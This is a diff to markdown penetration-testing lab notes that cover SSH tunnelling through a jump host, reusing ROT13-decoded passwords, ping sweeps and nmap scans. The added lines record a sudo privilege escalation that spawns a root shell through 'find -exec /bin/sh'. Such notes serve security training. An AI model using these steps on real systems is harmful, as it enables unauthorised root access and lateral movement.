@@ -174,6 +174,11 @@ ________________________________________________________________________________
 ## Now can make a tunnel to the .172 on port 22
 ### Use the passwords found before but converted from ROT13
     ssh -S /tmp/jump jump -O forward -L20003:192.168.28.172:22
+
+______________________________________________________________________________________________________________
+## Sudo -l when on the RoundSensor and GTFObins the find command
+### Escalates privileges to root
+    sudo find . -exec /bin/sh \; -quit
 ______________________________________________________________________________________________________________
 ## Ping Sweep
 ### On the new device
@@ -183,7 +188,6 @@ ________________________________________________________________________________
 ### route to the .172
     ssh -S /tmp/jump jump -O cancel -D9050
     ssh -S /tmp/t1 t1 -O forward -D9050
-
 ______________________________________________________________________________________________________________
 ## Nmap scan
 ### nc the ports below
